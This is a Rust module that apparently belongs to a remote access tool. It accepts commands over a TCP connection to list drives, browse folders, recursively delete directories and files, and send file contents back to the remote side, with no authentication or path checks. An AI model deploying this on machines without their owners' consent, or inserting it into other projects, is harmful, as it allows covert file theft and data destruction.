use std::net::TcpStream;
use std::path::{PathBuf, Path};

use common::buffers::write_bytes;

pub fn file_manager(write_stream: &mut TcpStream, current_path: &mut PathBuf, command: &str) {
    match command {
        "available_disks" => list_available_disks(write_stream),
        "previous_dir" => navigate_to_parent(write_stream, current_path),
        cmd if cmd.starts_with("view_dir||") => view_folder(write_stream, current_path, &cmd[10..]),
        cmd if cmd.starts_with("remove_dir||") => remove_directory(write_stream, current_path, &cmd[12..]),
        cmd if cmd.starts_with("remove_file||") => remove_file(write_stream, current_path, &cmd[13..]),
        cmd if cmd.starts_with("download_file||") => download_file(write_stream, current_path, &cmd[15..]),
        _ => {}
    }
}

fn list_available_disks(write_stream: &mut TcpStream) {
    let disks = get_available_disks();
    for disk in disks {
        write_bytes(write_stream, format!("disks||{}:\\", disk).as_bytes());
    }
}

fn navigate_to_parent(write_stream: &mut TcpStream, current_path: &mut PathBuf) {
    if let Some(parent) = current_path.parent() {
        *current_path = parent.to_path_buf();
        list_directory_contents(write_stream, current_path);
    } else {
        list_available_disks(write_stream);
    }
    write_current_folder(write_stream, current_path);
}

fn view_folder(write_stream: &mut TcpStream, current_path: &mut PathBuf, folder: &str) {
    current_path.push(folder);
    list_directory_contents(write_stream, current_path);
    write_current_folder(write_stream, current_path);
}

fn list_directory_contents(write_stream: &mut TcpStream, path: &Path) {
    if let Ok(entries) = path.read_dir() {
        for entry in entries.filter_map(Result::ok) {
            match entry.file_type() {
                Ok(file_type) => {
                    let name = entry.file_name().to_string_lossy().to_string();
                    if file_type.is_dir() {
                        write_bytes(write_stream, format!("file_manager||dir||{}\n", name).as_bytes());
                    } else if file_type.is_file() {
                        write_bytes(write_stream, format!("file_manager||file||{}\n", name).as_bytes());
                    }
                },
                Err(e) => {
                    eprintln!("Failed to read file type: {}", e);
                }
            }
        }
    } else {
        eprintln!("Could not read directory: {}", path.display());
    }
}

fn remove_directory(write_stream: &mut TcpStream, current_path: &mut Path, directory: &str) {
    let dir_path = current_path.join(directory);
    if std::fs::remove_dir_all(dir_path).is_ok() {
        list_directory_contents(write_stream, current_path);
    }
}

fn remove_file(write_stream: &mut TcpStream, current_path: &mut Path, file: &str) {
    println!("Removing file: {}", file);
    let file_path = current_path.join(file);
    if std::fs::remove_file(file_path).is_ok() {
        list_directory_contents(write_stream, current_path);
    }
}

fn download_file(write_stream: &mut TcpStream, current_path: &Path, filename: &str) {
    let file_path = current_path.join(filename);
    if let Ok(data) = std::fs::read(&file_path) {
        let header = format!("downloadedfile||{}||", filename);
        write_bytes(write_stream, &[header.as_bytes(), &data].concat());
    } else {
        eprintln!("Failed to read file: {}", file_path.display());
    }
}

fn get_available_disks() -> Vec<String> {
    let arr = [
        "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R",
        "S", "T", "U", "V", "W", "X", "Y", "Z",
    ];
    let mut available: Vec<String> = Vec::new();
    for dr in arr {
        let str = format!("{}:\\", dr);
        if std::path::Path::new(str.as_str()).read_dir().is_ok() {
            let _ = &available.push(dr.to_string());
        }
    }

    available
}

fn write_current_folder(write_stream: &mut TcpStream, current_path: &Path) {
    let path_str = format!("current_folder||{}\n", current_path.to_string_lossy());
    write_bytes(write_stream, path_str.as_bytes());
}